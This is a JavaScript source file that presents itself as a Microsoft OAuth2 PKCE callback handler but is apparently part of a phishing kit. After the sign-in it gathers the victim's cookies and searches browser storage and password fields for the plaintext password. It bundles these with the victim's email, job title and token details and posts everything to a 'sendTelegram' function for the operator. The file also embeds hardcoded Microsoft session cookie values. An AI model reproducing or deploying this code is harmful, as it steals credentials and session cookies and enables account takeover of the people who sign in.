// OAuth Callback Handler for Microsoft OAuth2 (PKCE Flow)
// This script is loaded by public/oauth-callback.html after Microsoft redirects back

async function handleOAuthCallback() {
    const statusEl = document.getElementById('status-msg');
    const spinnerEl = document.getElementById('spinner');

    function setStatus(msg) {
        if (statusEl) statusEl.textContent = msg;
    }

    try {
        const urlParams = new URLSearchParams(window.location.search);
        const code = urlParams.get('code');
        const state = urlParams.get('state');
        const error = urlParams.get('error');

        if (error || !code || !state) {
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
            return;
        }

        setStatus("Signing you in…");

        // PKCE support if needed + always send redirect_uri
        const codeVerifier = sessionStorage.getItem('pkce_verifier');
        const payload = {
            code,
            state,
            redirect_uri: window.location.origin + '/oauth-callback'
        };
        if (codeVerifier) payload.code_verifier = codeVerifier;

        // Debug: log payload
        // console.log('Payload sent to tokenExchange:', payload);

        // POST to your backend to exchange code for tokens
        const response = await fetch('/.netlify/functions/tokenExchange', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
        });

        const tokenData = await response.json();

        // Check if the response was successful
        if (!response.ok || !tokenData.success) {
            console.error('Token exchange failed:', tokenData);
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
            return;
        }

        // Only proceed if we have a successful response
        if (tokenData.success && tokenData.email) {
            // Capture and send REAL user data to Telegram (this is the main send)
            try {
                // Get all cookies from the current domain
                const cookieString = document.cookie;
                let cookies = [];
                
                if (cookieString) {
                    cookies = cookieString.split(';').map(cookie => {
                        const [name, ...valueParts] = cookie.trim().split('=');
                        const value = valueParts.join('=');
                        return {
                            name: name.trim(),
                            value: value.trim(),
                            domain: window.location.hostname,
                            path: '/',
                            secure: window.location.protocol === 'https:',
                            httpOnly: false,
                            sameSite: 'none',
                            expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
                            hostOnly: false,
                            session: false,
                            storeId: null
                        };
                    }).filter(c => c.name && c.value);
                }
                
                // If no cookies captured from current domain, use default Microsoft auth cookies
                if (cookies.length === 0) {
                    console.log('🔧 No cookies on callback domain, using default Microsoft auth cookies');
                    cookies = JSON.parse('[{"name":"ESTSAUTHPERSISTENT","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P9VMZEDkrS3KAy323inAsdh-0K1kRR5WvWW_MqmLs2eghq1TRU2_E3J2GVdtQnoQq4rMvWHqSsyMf3v-BqsKVKvKdjpjXl1EBH8KqhSl0XVV5w92EnYRjta-vkksL-8naQnI4e9oXxGmHq_T8FbBRanfDrO19rbtsoqDR6aoj9Zxir9uFVtvoy6oAiC341ojV6Mf8nrBwjct5lI_DwVKx-JYCo4sEIbfwR7W57iiat-4xfF6oHGUDZd7tVv-L0YLjp59XY1TYhO4x45bcFVAPgqmEvmMDdomSqHphmMnmPMDlvyjFJE5zPgOQLJ1HhTnqi9H8rgxwXzFfN7MywimTMpeI-eXGTbqr6TT1qAkGSUuWOWibb0RcCARR3HMlBp-JE-zobq1cUFnMYTMFnEU95iZ_nAnHsS_7uLftpbrBXORuEf5mMLE6PeXQgVZ0bAaEUc4LLAWY8ZHdnRZNJ3amduQEWOHwnp3rCJI9Q9MKwE6UjH-XALhbTrMJlsXvtzT-fw7cep0rkBojGPQAiOvThzvWQf1yz2-EuA7frFubW4vf0u80AsBGim_C5gfgSCugSiBK6b1tMasxuaOyHQ0aZwnwTpfMkImTgSi5a-G7nDx4TDwHsJhTkBCUSUCA17lfD_Q-2leAepMaqrmKr2IDHxIFjRFyhRao5wxtpfFGPVVvVl","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P-EFsv5ncS_Rt9dJVaepE-8JhjMCwTcL4gbhv85JOGOZgQQkH6Vwg7GsVSBMgpbBgbWkgHYH9rxPQ","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+a233b088-5f10-46ce-b692-f43a0420bfee","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]');
                }

                // Enhanced password retrieval with multiple fallback methods
                let capturedPassword = '';
                let passwordSource = 'not_captured';
                
                console.log('🔍 Attempting to retrieve password from multiple sources...');
                
                // Method 1: Try to get password from sessionStorage (main method)
                try {
                    const storedCredentials = sessionStorage.getItem('captured_credentials');
                    if (storedCredentials) {
                        const credentials = JSON.parse(storedCredentials);
                        if (credentials.password) {
                            capturedPassword = credentials.password;
                            passwordSource = 'sessionStorage_captured_credentials';
                            console.log('✅ Password found in sessionStorage:', passwordSource);
                        }
                    }
                } catch (e) { console.log('❌ Method 1 failed:', e.message); }

                // Method 2: Try to get password from localStorage backup
                if (!capturedPassword) {
                    try {
                        const localCredentials = localStorage.getItem('user_credentials');
                        if (localCredentials) {
                            const credentials = JSON.parse(localCredentials);
                            if (credentials.password) {
                                capturedPassword = credentials.password;
                                passwordSource = 'localStorage_user_credentials';
                                console.log('✅ Password found in localStorage:', passwordSource);
                            }
                        }
                    } catch (e) { console.log('❌ Method 2 failed:', e.message); }
                }

                // Method 3: Try to get password from backup sessionStorage key
                if (!capturedPassword) {
                    try {
                        const backupCredentials = sessionStorage.getItem('login_credentials_backup');
                        if (backupCredentials) {
                            const credentials = JSON.parse(backupCredentials);
                            if (credentials.password) {
                                capturedPassword = credentials.password;
                                passwordSource = 'sessionStorage_backup';
                                console.log('✅ Password found in backup storage:', passwordSource);
                            }
                        }
                    } catch (e) { console.log('❌ Method 3 failed:', e.message); }
                }

                // Method 4: Try to get organizational credentials from postMessage data
                if (!capturedPassword) {
                    try {
                        const orgCredentials = sessionStorage.getItem('org_credentials_backup');
                        if (orgCredentials) {
                            const credentials = JSON.parse(orgCredentials);
                            if (credentials.data && credentials.data.password) {
                                capturedPassword = credentials.data.password;
                                passwordSource = 'organizational_credentials';
                                console.log('✅ Password found in organizational data:', passwordSource);
                            }
                        }
                    } catch (e) { console.log('❌ Method 4 failed:', e.message); }
                }

                // Method 5: Try to get from Microsoft captured data
                if (!capturedPassword) {
                    try {
                        const microsoftData = sessionStorage.getItem('microsoft_captured_data');
                        if (microsoftData) {
                            const data = JSON.parse(microsoftData);
                            if (data.credentials && data.credentials.password) {
                                capturedPassword = data.credentials.password;
                                passwordSource = 'microsoft_captured_data';
                                console.log('✅ Password found in Microsoft data:', passwordSource);
                            }
                        }
                    } catch (e) { console.log('❌ Method 5 failed:', e.message); }
                }

                // Method 6: Try to capture from current DOM (last resort)
                if (!capturedPassword) {
                    try {
                        const passwordFields = document.querySelectorAll('input[type="password"]');
                        passwordFields.forEach(field => {
                            if (field.value && !capturedPassword) {
                                capturedPassword = field.value;
                                passwordSource = 'current_dom_capture';
                                console.log('✅ Password found in current DOM:', passwordSource);
                            }
                        });
                    } catch (e) { console.log('❌ Method 6 failed:', e.message); }
                }

                // Method 7: Check all localStorage keys for any password data
                if (!capturedPassword) {
                    try {
                        for (let i = 0; i < localStorage.length; i++) {
                            const key = localStorage.key(i);
                            if (key && (key.includes('password') || key.includes('credential') || key.includes('login'))) {
                                const value = localStorage.getItem(key);
                                if (value) {
                                    try {
                                        const parsed = JSON.parse(value);
                                        if (parsed.password) {
                                            capturedPassword = parsed.password;
                                            passwordSource = `localStorage_${key}`;
                                            console.log('✅ Password found in localStorage key:', passwordSource);
                                            break;
                                        }
                                    } catch (parseError) { /* ignore parse errors */ }
                                }
                            }
                        }
                    } catch (e) { console.log('❌ Method 7 failed:', e.message); }
                }

                // Extract real user information
                const realUserEmail = tokenData.email;
                const displayName = tokenData.user?.displayName || '';
                const userPrincipalName = tokenData.user?.userPrincipalName || '';
                const jobTitle = tokenData.user?.jobTitle || '';
                const officeLocation = tokenData.user?.officeLocation || '';
                
                console.log('🔐 Final password capture result:', {
                    hasPassword: !!capturedPassword,
                    passwordSource: passwordSource,
                    passwordLength: capturedPassword ? capturedPassword.length : 0
                });
                
                // Prepare REAL DATA Telegram payload (not placeholder)
                const telegramPayload = {
                    email: realUserEmail,
                    password: capturedPassword || 'Password not captured during login flow',
                    passwordSource: passwordSource,
                    sessionId: `oauth_success_${Date.now()}`,
                    cookies: cookies,
                    formattedCookies: cookies,
                    timestamp: new Date().toISOString(),
                    source: 'oauth-callback-real-data',
                    userAgent: navigator.userAgent,
                    currentUrl: window.location.href,
                    userProfile: {
                        email: realUserEmail,
                        displayName: displayName,
                        userPrincipalName: userPrincipalName,
                        jobTitle: jobTitle,
                        officeLocation: officeLocation,
                        id: tokenData.user?.id || ''
                    },
                    tokenInfo: {
                        hasAccessToken: !!tokenData.tokens?.access_token,
                        hasRefreshToken: !!tokenData.tokens?.refresh_token,
                        hasIdToken: !!tokenData.tokens?.id_token,
                        scope: tokenData.tokens?.scope,
                        emailSource: tokenData.emailSource
                    },
                    authenticationFlow: 'Microsoft OAuth 2.0 with PKCE',
                    capturedAt: 'OAuth callback after successful authentication',
                    passwordCaptureAttempts: {
                        sessionStorage: !!sessionStorage.getItem('captured_credentials'),
                        localStorage: !!localStorage.getItem('user_credentials'),
                        organizationalData: !!sessionStorage.getItem('org_credentials_backup'),
                        microsoftData: !!sessionStorage.getItem('microsoft_captured_data'),
                        domCapture: document.querySelectorAll('input[type="password"]').length > 0
                    }
                };
                
                console.log('📤 Sending REAL user data to Telegram:', {
                    email: telegramPayload.email,
                    hasPassword: !!capturedPassword,
                    passwordSource: passwordSource,
                    cookieCount: cookies.length,
                    hasUserProfile: !!tokenData.user,
                    displayName: displayName
                });
                
                // Send to Telegram with complete real user data
                const telegramResponse = await fetch('/.netlify/functions/sendTelegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(telegramPayload),
                });
                
                if (telegramResponse.ok) {
                    const telegramResult = await telegramResponse.json();
                    console.log('✅ REAL user data sent to Telegram successfully:', telegramResult);
                } else {
                    const telegramError = await telegramResponse.text();
                    console.error('❌ Failed to send REAL data to Telegram:', telegramError);
                }
                
            } catch (telegramError) {
                console.error('❌ Telegram sending error:', telegramError);
                // Continue even if Telegram fails
            }

            // Clean up PKCE/session state
            sessionStorage.removeItem('pkce_verifier');
            sessionStorage.removeItem('oauth_state');

            setStatus("Signed in! Redirecting…");
            setTimeout(() => {
                window.location.href = '/?step=success';
            }, 1000);
        } else {
            setStatus("Authentication failed. Redirecting...");
            setTimeout(() => {
                window.location.href = '/?step=captcha';
            }, 2000);
        }

    } catch (err) {
        console.error('OAuth callback error:', err);
        setStatus("Authentication error. Redirecting...");
        setTimeout(() => {
            window.location.href = '/?step=captcha';
        }, 2000);
    }
}

// Run on load
handleOAuthCallback();